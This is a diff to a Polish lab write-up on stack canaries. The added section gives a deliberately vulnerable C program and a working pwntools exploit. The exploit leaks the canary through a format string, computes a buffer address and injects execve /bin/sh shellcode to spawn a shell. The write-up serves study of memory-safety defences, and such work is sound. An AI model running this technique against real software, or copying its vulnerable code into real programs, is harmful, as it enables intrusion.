@@ -24,7 +24,7 @@ Kanarek nie chroni przed atakami typu `format string`.
 
 Koniec wywołania funkcji z kanarkiem wygląda następująco.
 
-![img_2.png](img/img_2.png)
+![img_2.png](img/img_7.png)
 
 Do rejestru `eax` ładowany jest aktualny kanarek funkcji. Następnie odejmowany jest on od zapisanego kanarka w `gs:0x14`. W przypadku zgodności kanarków wartość odejmowania to zero.
 
@@ -62,7 +62,7 @@ void ask_for_name()
 
 int main()
 {
-a   sk_for_name();
+    ask_for_name();
 return 0;
 }
 ```
@@ -89,17 +89,111 @@ p.interactive()
 
 W tym przypadku przy kompilacji bez kanarka udaje się dostać shell.
 
-![img.png](img/img.png)
+![img.png](img/img_5.png)
 
 A w przypadku kompilacji z kanarkiem nie udaje się - widzimy tutaj błąd, który wyrzucił kanarek.
 
+![img_1.png](img/img_6.png)
+
+
+### 2.4 Proof of concept - leak kanarka i wykonywalny stos
+
+Istotą tego exploitu będzie pozyskanie wartości kanarka za pomocą format string.
+
+Kod aplikacji podatnej: 
+
+```c
+#include <stdio.h>
+
+int main(int argc, char *argv[]) {
+    char name[16];
+    char purpose[64];
+
+    gets(name);
+    printf("Hi!");
+    printf(name);
+    printf("\n");
+    gets(purpose);
+    printf("%s",purpose);
+    return 0;
+
+}
+```
+
+Schemat działania:
+- Zlokalizować, którym argumentem pozycyjnym na stosie jest kanarek.
+- Zlokalizować element na stosie, który ma stały adres względem drugiego bufora.
+- Za pomocą otrzymanego adresu oraz wartości kanarka zbudować shellcode.
+
+Aby otrzymać argumenty bedę używał exploitu format string. Konstrukcja `%15$x` pobierze 15 element ze stosu, liczbę mogę podmieniać.
+
+Podpinam `gdb` do procesu aplikacji i szukam adresu do zatrzymania wykonania. Wybieram adres przed sprawdzeniem kanarka. Widzę też gdzie pominien znajdować się kanarek -`[ebp-0xc]`.
+
+![img.png](img/img.png)
+
+W `gdb` wyświetlam stos i lokalizuję kanarka.
+
 ![img_1.png](img/img_1.png)
 
+Kanarek znajduję się w zamierzonym miejscu. Dwa adresy wyżej widzę również adres, który wygląda na adres, który może posłużyć do znalezienia offsetu naszego bufora. Upewniam się ze adres ten jest dobry kilkukrotnie wywołując program i sprawdzając offset od bufora - jest on stały i wynosi `0x108`.
 
-### 1.4 Proof of concept - atak na kanarka
+Teraz strzelam w losowy argument na stosie i staram się ustalić gdzie jest kanarek i mój adres.
 
+```c
+import * from pwn
 
+p = process("./vuln_2.o")
 
-### 1.5 Wnioski
+first_payload = "%20$x%21$x"
+```
+
+![img_2.png](img/img_2.png)
+
+Otrzymuje dwa adresy, które znajduję na stosie.
+
+![img_3.png](img/img_3.png)
+
+Kanarek znajduję się na 31 pozycji, a nasz adres na 29. Od drugiego adresu muszę odjąć `0x108` i dodać offset wygenerowany przez elementy przed shellcode.
+
+Gotowy shellcode bedzie wyglądał tak:
+```
+'aaaa...'+kanarek+adres_shellcode+shellcode
+```
+Piszę exploit:
+
+```python
+from pwn import *
+
+p = process("./vuln_2.o")
+
+first_payload = ",%29$x,%31$x"
+p.sendline(first_payload) # wysylam format string do leakowania informacji
+gdb.attach(p)
+answer = p.recvline().decode("utf-8").split(',') # formatuje informacje
+canary = int(answer[2],16) 
+offset_address = int(answer[1],16)
+buffor_address = offset_address - 0x108 
+stuffed_canary = b'a'*64+p32(canary)
+
+shellcode_address = buffor_address + len(stuffed_canary) +4
+shellcode = b'\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
+
+second_payload = stuffed_canary + p32(shellcode_address) + shellcode
+
+p.sendline(second_payload)
+
+p.interactive()
+
+```
+
+Został wywołany shell - exploit działa.
+
+![img_4.png](img/img_4.png)
+
+### 1.5 Proof of concept - GOT overwrite z format string
+
+Opis tego exploita znajduje się w następnym rodziale, jest to exploit przed, którym kanarek nie jest w stanie ochronić. Kanarek w żaden sposób nie chroni przed atakami typu format string oraz atakami typu GOT.
+
+### 1.6 Wnioski
 
 Kanarek stosu jest dobrą metodą zabezpieczenia przed nadpisaniem adresu powrotu. Dobrą praktyką jest stosowanie go w funkcjach zawierających bufor.
